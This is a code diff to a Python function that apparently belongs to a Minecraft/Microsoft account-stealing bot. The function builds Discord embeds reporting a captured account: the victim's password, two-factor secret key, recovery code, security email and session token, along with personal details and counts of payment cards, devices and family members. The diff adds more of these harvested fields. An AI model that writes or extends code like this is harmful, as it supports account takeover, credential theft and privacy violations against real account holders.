@@ -9,12 +9,25 @@ import time
 async def build_account_embeds(account: dict, elapsed: float = 0, claim_id: str = "") -> dict:
     name = quote(account["minecraft"]["name"])
 
+    ms = account["microsoft"]
+    family = ms["family"]
+    devices = ms["devices"]
+    cards = ms["cards"]
+    subs = ms["subscriptions"]
+
     info_embed = Embed()
-    info_embed.add_field(name="First Name", value=f"```{account['microsoft']['firstName']}```", inline=False)
-    info_embed.add_field(name="Last Name", value=f"```{account['microsoft']['lastName']}```", inline=True)
-    info_embed.add_field(name="Full Name", value=f"```{account['microsoft']['fullName']}```", inline=False)
-    info_embed.add_field(name="Region", value=f"```{account['microsoft']['region']}```", inline=False)
-    info_embed.add_field(name="Birthday", value=f"```{account['microsoft']['birthday']}```", inline=False)
+    info_embed.add_field(name="First Name", value=f"```{ms['firstName']}```", inline=True)
+    info_embed.add_field(name="Last Name", value=f"```{ms['lastName']}```", inline=True)
+    info_embed.add_field(name="Full Name", value=f"```{ms['fullName']}```", inline=False)
+    info_embed.add_field(name="Region", value=f"```{ms['region']}```", inline=True)
+    info_embed.add_field(name="Birthday", value=f"```{ms['birthday']}```", inline=True)
+    info_embed.add_field(name="Language", value=f"```{ms['language']}```", inline=True)
+    info_embed.add_field(name="Family Members", value=f"```{len(family) if family else 'None'}```", inline=True)
+    info_embed.add_field(name="Devices", value=f"```{len(devices) if devices else 'None'}```", inline=True)
+    info_embed.add_field(name="Payment Cards", value=f"```{len(cards) if cards else 'None'}```", inline=True)
+    info_embed.add_field(name="Active Subs", value=f"```{len(subs['active']) if subs['active'] else 'None'}```", inline=True)
+    info_embed.add_field(name="Canceled Subs", value=f"```{len(subs['canceled']) if subs['canceled'] else 'None'}```", inline=True)
+    info_embed.add_field(name="Commercial Subs", value=f"```{len(subs['commercial']) if subs['commercial'] else 'None'}```", inline=True)
 
     hstats = await get_hypixel_stats(name)
     dstats = await get_donut_stats(name)
@@ -45,11 +58,11 @@ async def build_account_embeds(account: dict, elapsed: float = 0, claim_id: str 
     hit_embed.add_field(name="MC Username", value=f"```{account['minecraft']['name']}```", inline=False)
     hit_embed.add_field(name="MC Method", value=f"```{account['minecraft']['method']}```", inline=True)
     hit_embed.add_field(name="MC Capes", value=f"```{account['minecraft']['capes']}```", inline=True)
-    hit_embed.add_field(name="Primary Email", value=f"```{account['microsoft']['email']}```", inline=False)
-    hit_embed.add_field(name="Security Email", value=f"```{account['microsoft']['security_email']}```", inline=True)
-    hit_embed.add_field(name="Password", value=f"```{account['microsoft']['password']}```", inline=False)
-    hit_embed.add_field(name="Secret Key", value=f"```{account['microsoft']['auth_secret']}```", inline=False)
-    hit_embed.add_field(name="Recovery Code", value=f"```{account['microsoft']['recovery_code']}```", inline=False)
+    hit_embed.add_field(name="Primary Email", value=f"```{ms['email']}```", inline=False)
+    hit_embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
+    hit_embed.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
+    hit_embed.add_field(name="Secret Key", value=f"```{ms['auth_secret']}```", inline=False)
+    hit_embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
     hit_embed.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")
 
     ssid_embed = Embed(
@@ -73,10 +86,10 @@ async def build_account_embeds(account: dict, elapsed: float = 0, claim_id: str 
                 f"**Username:** {account['minecraft']['name']}\n"
                 f"**Has MC:** {True if account['minecraft']['SSID'] else False}\n"
                 f"**Capes:** {account['minecraft']['capes']}\n"
-                f"**Email:** {account['microsoft']['email']}\n"
-                f"**Security Email:** {account['microsoft']['security_email']}\n"
-                f"**Password:** {account['microsoft']['password']}\n"
-                f"**Recovery Code:** {account['microsoft']['recovery_code']}"
+                f"**Email:** {ms['email']}\n"
+                f"**Security Email:** {ms['security_email']}\n"
+                f"**Password:** {ms['password']}\n"
+                f"**Recovery Code:** {ms['recovery_code']}"
             )
         }
     }
